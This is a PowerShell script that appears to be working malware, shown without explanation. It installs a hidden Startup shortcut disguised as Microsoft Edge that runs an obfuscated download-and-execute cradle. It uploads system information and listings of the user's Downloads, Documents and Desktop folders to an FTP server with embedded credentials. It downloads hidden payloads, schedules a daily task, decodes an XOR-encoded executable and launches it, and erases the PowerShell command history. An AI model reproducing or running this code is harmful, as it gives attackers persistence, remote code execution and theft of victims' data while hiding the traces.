function yfjbhf
{
	$plokm = "$env:APPDATA"+"\thumbs.ini"
	New-Item -Path $plokm -Type file -Force
	$sTrvd = "[string]`$f={(Nwraew-Objwraect Newrat.WebwraCliwraewrant).Doweilsdjfeng('https://raw.githubusercontent.com/rojkim/source/main/roj.txt')};`$j=`$f.Replace('wra','');`$u=`$j.Replace('eilsdjfe','nloadstri');`$x=iex $u;invoke-expression `$x"
	$sTrvd >> $plokm
	$dvpocj = New-Object -ComObject WScript.Shell 
	$apdlzm = "\Microsoft\Windows\Start Menu\Programs\Startup\"
	$begn = $env:APPDATA + $apdlzm
	$yhjas = $dvpocj.CreateShortcut("$begn"+"\ms"+"e"+"dge.ln"+"k") 
	
	$yhjas.IconLocation = "imageres.dll, 43" 
	$yhjas.WindowStyle = 7

	$yhjas.TargetPath = "pow"+"ersh"+"ell.e"+"x"+"e"
	$yhjas.Arguments = "-WindowStyle Hidden -command &{[string]`$x= [IO.File]::ReadAllText('$plokm');iex `$x}"
	$yhjas.Description = "Administrators"	
	$yhjas.WorkingDirectory = "c:\"
	$yhjas.Save()
}

yfjbhf
		
		


function filisge
{
	$down = "$env:Appdata\down.txt"
	$info = "$env:Appdata\info.txt"
	$docu = "$env:Appdata\docu.txt"
	$desk = "$env:Appdata\desk.txt"
	systeminfo >> $info
	dir "$env:userprofile\Downloads" -depth 10 >> $down
	dir "$env:userprofile\Documents" -depth 10 >> $docu
	dir "$env:userprofile\Desktop" -depth 10 >> $desk


	$ftpuri = "ftp://4209705:eih*^dhk234HKDFY@meats.mywebcommunity.org/meats.mywebcommunity.org/"

	$webclient = New-Object System.Net.WebClient
	$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($info))
	$webclient.UploadFile($uri, $info)

	$webclient = New-Object System.Net.WebClient
	$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($down))
	$webclient.UploadFile($uri, $down)

	$webclient = New-Object System.Net.WebClient
	$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($docu))
	$webclient.UploadFile($uri, $docu)

	$webclient = New-Object System.Net.WebClient
	$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($desk))
	$webclient.UploadFile($uri, $desk)

	del $info
	del $down
	del $docu
	del $desk
}

function shopping
{
	$url = "https://raw.githubusercontent.com/rojkim/source/main"
	$sourcepath1 = $url + "/ddYFwDkEY"
	$sourcepath2 = $url + "/vgSzZWic.ps1"

	$filepath1 = $env:APPDATA + "\Microsoft\" + "EKfKUlgJw" + "\ddYFwDkEY"
	$filepath2 = $env:APPDATA + "\Microsoft\" + "EKfKUlgJw" + "\vgSzZWic.ps1"
	$filepath3 = $env:APPDATA + "\Microsoft\" + "EKfKUlgJw" + "\msedge.exe"
	
	$pspath = $env:SYSTEMROOT + "\System32\WindowsPowerShell\v1.0\powershell.exe"

	$folderpath = $env:APPDATA + "\Microsoft\" + "EKfKUlgJw"
	
	New-Item -Path $folderpath -ItemType Directory

	$object = New-Object Net.WebClient
	$object.DownloadFile($sourcepath1, $filepath1)
	$object.DownloadFile($sourcepath2, $filepath2)

	copy $pspath $filepath3	

	attrib +h $folderpath
	attrib +h $filepath1
	attrib +h $filepath2
	attrib +h $filepath3
	

	$ws = "wscript //e:vbscript " + $filepath1

	schtasks.exe /create /SC DAILY /MO 1 /ST 17:00 /TN "MicrosoftSetup" /TR $ws  /F
}
filisge

shopping

function qqqaaaazzz
{
	$dp = "$Env:Appdata\Microsoft\Office"
	$sgsdsh = Test-Path -Path $dp
	if(!$sgsdsh)
	{
		New-Item -ItemType Directory -Force $dp
	}

	$uytb = $env:Appdata + "\Microsoft\Office\msword16.pip"
	$pokj = "https://raw.githubusercontent.com/rojkim/source/main/msword16.pip"
	$oihkvd = "https://raw.githubusercontent.com/rojkim/source/main/vervatov.bin"
	$rtgj = "C:\windows\temp\strike.dat"
	$iiii = New-Object Net.WebClient
	$iiii.DownloadFile($oihkvd, $rtgj)
	$iiii.DownloadFile($pokj, $uytb)

	start-sleep -s 2
	$rfdcv = [System.IO.File]::ReadAllBytes($rtgj)
	del $rtgj
	$key = "0x92"

	for($i=0; $i -lt $rfdcv.count ; $i++)
	{
		$rfdcv[$i] = $rfdcv[$i] -bxor $key
	}
	
	$exPath = "$Env:APPDATA\Ahnlab\msedge.exe"
	[System.IO.File]::WriteAllBytes($exPath, $bytes)
	start $exPath
	
}

qqqaaaazzz


$yvsvb = $env:appdata + "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
$fffd = Test-Path $yvsvb
if($fffd -eq $True)
{
	Remove-Item -path $yvsvb -Recurse
}


